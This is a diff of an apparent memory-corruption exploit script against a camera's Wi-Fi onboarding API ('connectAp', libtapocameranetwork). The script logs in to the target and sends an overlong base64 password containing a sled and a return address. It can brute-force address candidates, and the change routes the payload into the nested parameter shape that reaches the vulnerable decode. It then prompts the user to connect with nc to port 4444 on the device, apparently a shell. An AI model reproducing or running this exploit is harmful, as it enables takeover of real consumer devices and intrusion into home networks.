@@ -104,11 +104,25 @@ def req(host, sess, inner, timeout=8):
     return j
 
 
+def connect_params(b64: str, ssid: str, bssid: str) -> dict:
+    """The only shape that reaches the decode: nested onboarding.connect.
+
+    A flat {ssid,password,encrypt_type} is accepted and harmless. `unique_key`
+    must be an Integer and the model also carries rssi/band (WifiUniqueKey in
+    libtapocameranetwork); a 16-char string takes an error path.
+    """
+    return {"onboarding": {"connect": {
+        "ssid": ssid, "bssid": bssid, "auth": 1, "encryption": 3, "rssi": -50,
+        "password": b64, "unique_key": 0, "band": 0}}}
+
+
 def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("mode", choices=["build", "send", "ret2stack", "brute"])
     ap.add_argument("--offset", type=lambda x: int(x, 0), default=1060)
-    ap.add_argument("--host", default="192.168.4.70")
+    ap.add_argument("--host", default="192.168.6.70")
+    ap.add_argument("--ssid", default="Aardvark")
+    ap.add_argument("--bssid", default="00:00:00:00:00:00")
     ap.add_argument("--marker", type=lambda x: int(x, 0))
     ap.add_argument("--out", default=None)
     ap.add_argument("--addr", type=lambda x: int(x, 0), default=None)
@@ -126,8 +140,9 @@ def main():
         sess = login(a.host)
         for i in range(a.count if a.mode == "brute" else 1):
             candidate = base + i * a.step
-            b64 = build(a.offset, addr=candidate, sled=a.sled, padpc=a.padpc)
-            params = {"ssid": "Aardvark", "password": b64, "encrypt_type": "3"}
+            b64 = build(a.offset, addr=candidate, sled=a.sled, padpc=a.padpc,
+                        prefix=a.prefix.encode())
+            params = connect_params(b64, a.ssid, a.bssid)
             t0 = time.time()
             r = req(a.host, sess, {"method": "connectAp", "params": params}, timeout=6)
             ok = "raw" not in r
@@ -152,13 +167,9 @@ def main():
         return
 
     sess = login(a.host)
-    for enc in ("3", None):
-        params = {"ssid": "Aardvark", "password": b64}
-        if enc:
-            params["encrypt_type"] = enc
-        t0 = time.time()
-        r = req(a.host, sess, {"method": "connectAp", "params": params})
-        print("enc=%s %.2fs %s" % (enc, time.time() - t0, json.dumps(r)[:200]))
+    t0 = time.time()
+    r = req(a.host, sess, {"method": "connectAp", "params": connect_params(b64, a.ssid, a.bssid)})
+    print("%.2fs %s" % (time.time() - t0, json.dumps(r)[:200]))
     print("now: nc %s 4444" % a.host)
 
 
